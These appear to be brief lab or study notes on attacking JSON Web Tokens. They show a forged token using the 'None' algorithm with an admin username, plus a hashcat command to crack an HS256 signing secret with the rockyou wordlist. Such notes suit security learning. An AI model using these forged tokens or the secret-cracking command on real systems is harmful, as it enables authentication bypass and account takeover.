____

https://jwt.io/

# Bypassing signature checks

![[Pasted image 20241216131947.png]]
{"typ":"JWT","alg":"None"}
eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0=

{"username":"admin"}
eyJ1c2VybmFtZSI6ImFkbWluIn0=

the same
ODnAXt9IXHDcP17XNR1yqHedzpifSsIejjDujNyiyRI

![[Pasted image 20241216132847.png]]

# Crackable key

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.TXSbnEmdp-kgdKfOflVsbifEd8AYZn0JEnAIBqG0QQY
```

```bash
hashcat -m 16500 -a 0 jwt.txt /usr/share/seclists/rockyou.txt
```

![[Pasted image 20241216133932.png]]